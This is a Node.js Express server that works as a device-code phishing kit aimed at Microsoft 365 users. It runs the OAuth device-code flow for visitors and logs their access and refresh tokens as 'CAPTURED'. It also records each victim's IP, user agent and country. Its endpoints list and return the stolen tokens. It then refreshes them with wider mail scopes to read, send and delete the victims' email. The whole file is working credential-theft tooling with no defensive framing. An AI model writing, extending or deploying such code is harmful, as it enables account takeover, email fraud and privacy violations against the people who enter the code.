const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// ============================================
// YOUR EXISTING CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

// Store sessions
let userSessions = new Map();
let pendingAuth = new Map();
let sessionCounter = 1;
let totalVisits = 0;

// Country colors and flags
const countryData = {
    'United States': { color: '#B22234', flag: '🇺🇸' },
    'Canada': { color: '#FF0000', flag: '🇨🇦' },
    'United Kingdom': { color: '#00247D', flag: '🇬🇧' },
    'Germany': { color: '#FFCC00', flag: '🇩🇪' },
    'France': { color: '#0055A4', flag: '🇫🇷' },
    'Japan': { color: '#BC002D', flag: '🇯🇵' },
    'Australia': { color: '#012169', flag: '🇦🇺' },
    'India': { color: '#FF9933', flag: '🇮🇳' },
    'Netherlands': { color: '#FF7900', flag: '🇳🇱' },
    'Sweden': { color: '#005B99', flag: '🇸🇪' },
    'Other': { color: '#6B8E23', flag: '🌍' }
};

function getCountryFromIp(ip) {
    const countryMap = {
        '46.183': 'United States',
        '172.': 'United States',
        '104.': 'United States',
        '185.': 'Germany',
        '188.': 'United Kingdom',
        '45.': 'Canada',
        '103.': 'India',
        '31.': 'Netherlands',
        '46.': 'Sweden'
    };
    for (const [prefix, country] of Object.entries(countryMap)) {
        if (ip.startsWith(prefix)) return country;
    }
    return 'Other';
}

function generateSessionId() {
    return sessionCounter++;
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// START AUTHENTICATION
// ============================================
app.post('/start', async (req, res) => {
    try {
        const sessionId = generateSessionId();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const country = getCountryFromIp(clientIp);
        
        totalVisits++;
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in, interval } = response.data;
        
        pendingAuth.set(sessionId, {
            device_code, user_code, sessionId, status: 'pending',
            ip: clientIp, userAgent: userAgent, country: country,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sessionId);
        
        res.json({
            userCode: user_code,
            sessionId: sessionId,
            interval: interval || 5,
            expiresIn: expires_in
        });
        
    } catch (err) {
        console.error('Start error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(sessionId);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            const userName = userInfo.data.displayName;
            const now = Date.now();
            
            userSessions.set(sessionId, {
                id: sessionId,
                email: userEmail,
                name: userName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                country: pending.country,
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token,
                expires_in: tokens.expires_in,
                expires_at: now + (tokens.expires_in * 1000),
                capturedAt: now
            });
            
            pending.status = 'success';
            pending.email = userEmail;
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            
            console.log(`✅ CAPTURED: ${userEmail} (${pending.country}, ${pending.ip})`);
            
        } catch (err) {}
    }, 2000);
}

app.get('/state', async (req, res) => {
    const sessionId = parseInt(req.query.session_id);
    if (!sessionId) return res.json({ status: 'error' });
    
    const session = userSessions.get(sessionId);
    if (session) return res.json({ status: 'success', email: session.email });
    
    const pending = pendingAuth.get(sessionId);
    if (pending) return res.json({ status: 'pending' });
    
    res.json({ status: 'pending' });
});

// ============================================
// GET FRESH ACCESS TOKEN USING PRT
// ============================================
async function getFreshAccessToken(email) {
    let session = null;
    for (const [id, s] of userSessions.entries()) {
        if (s.email === email) {
            session = s;
            break;
        }
    }
    
    if (!session || !session.refresh_token) return null;
    
    try {
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.refresh_token,
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        session.access_token = response.data.access_token;
        session.expires_at = Date.now() + (response.data.expires_in * 1000);
        
        return response.data.access_token;
    } catch (err) {
        return null;
    }
}

// ============================================
// API ENDPOINTS
// ============================================
app.get('/api/sessions', (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        id: s.id,
        email: s.email,
        name: s.name,
        ip: s.ip,
        country: s.country,
        userAgent: s.userAgent,
        type: 'Graph API',
        capturedAt: new Date(s.capturedAt).toLocaleString(),
        expiresAt: s.refresh_token ? 'Permanent (PRT)' : new Date(s.expires_at).toLocaleString(),
        hasPRT: !!s.refresh_token
    }));
    res.json({ sessions: sessions, total: sessions.length });
});

app.get('/api/session/token/:email', async (req, res) => {
    const { email } = req.params;
    let session = null;
    for (const [id, s] of userSessions.entries()) {
        if (s.email === email) {
            session = s;
            break;
        }
    }
    
    if (!session) return res.status(404).json({ error: 'Session not found' });
    
    const freshToken = await getFreshAccessToken(email);
    
    res.json({
        email: session.email,
        access_token: freshToken || session.access_token,
        refresh_token: session.refresh_token,
        expires_in: session.expires_in
    });
});

app.get('/api/list_access_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values()).map(s => ({
        id: s.id,
        user: s.email,
        name: s.name,
        resource: 'Microsoft Graph',
        accesstoken: s.access_token,
        issued_at: new Date(s.capturedAt).toLocaleString(),
        expires_at: new Date(s.expires_at).toLocaleString()
    }));
    res.json(tokens);
});

app.get('/api/list_refresh_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values())
        .filter(s => s.refresh_token)
        .map(s => ({
            id: s.id,
            user: s.email,
            name: s.name,
            resource: 'Microsoft Graph (PRT) - Permanent',
            refreshtoken: s.refresh_token
        }));
    res.json(tokens);
});

app.get('/api/country_stats', (req, res) => {
    const countryCount = {};
    for (const session of userSessions.values()) {
        const country = session.country || 'Other';
        countryCount[country] = (countryCount[country] || 0) + 1;
    }
    res.json({ countries: countryCount, total: userSessions.size });
});

app.get('/api/overview_stats', (req, res) => {
    const totalSessions = userSessions.size;
    const totalPRTs = Array.from(userSessions.values()).filter(s => s.refresh_token).length;
    const countries = new Set(Array.from(userSessions.values()).map(s => s.country)).size;
    
    res.json({
        totalVisits: totalVisits,
        totalSessions: totalSessions,
        totalPRTs: totalPRTs,
        totalCountries: countries,
        lastCapture: totalSessions > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => s.capturedAt))).toLocaleString() : 'None'
    });
});

app.delete('/api/delete_access_token/:id', (req, res) => {
    const id = parseInt(req.params.id);
    if (userSessions.has(id)) {
        userSessions.delete(id);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Token not found' });
    }
});

app.delete('/api/delete_refresh_token/:id', (req, res) => {
    const id = parseInt(req.params.id);
    if (userSessions.has(id)) {
        userSessions.delete(id);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Token not found' });
    }
});

app.delete('/api/sessions/clear', (req, res) => {
    userSessions.clear();
    pendingAuth.clear();
    sessionCounter = 1;
    totalVisits = 0;
    res.json({ success: true });
});

// ============================================
// MAILBOX API - Full Outlook Integration
// ============================================
app.get('/api/mail/folders/:email', async (req, res) => {
    const { email } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token. Please re-authenticate.' });
    
    try {
        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 100, '$select': 'id,displayName,totalItemCount,unreadItemCount' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch folders' });
    }
});

app.get('/api/mail/:email/:folderId', async (req, res) => {
    const { email, folderId } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

app.get('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments,conversationId' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

app.post('/api/mail/send/:email', async (req, res) => {
    const { email } = req.params;
    const { to, subject, body } = req.body;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(addr => ({ emailAddress: { address: addr } }))
            },
            saveToSentItems: true
        }, { headers: { 'Authorization': `Bearer ${token}` } });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const { isRead } = req.body;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}` } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update' });
    }
});

// ============================================
// SETTINGS API
// ============================================
let config = {
    active_resource: 'graph',
    api_version: '2',
    openai_enabled: false,
    openai_api_key: '',
    openai_model: 'gpt-3.5-turbo',
    openai_max_tokens: 500,
    openai_temperature: 0.7
};

app.get('/api/settings', (req, res) => res.json(config));
app.post('/api/settings', (req, res) => { config = { ...config, ...req.body }; res.json({ success: true }); });
app.get('/api/resource/settings', (req, res) => res.json({ success: true, active_resource: config.active_resource }));
app.post('/api/resource/settings', (req, res) => { config.active_resource = req.body.active_resource; res.json({ success: true }); });
app.post('/api/openai/settings', (req, res) => { Object.assign(config, req.body); res.json({ success: true }); });

// ============================================
// SERVE FILES
// ============================================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Graph API Ready - Mailbox enabled`);
    console.log(`========================================\n`);
});
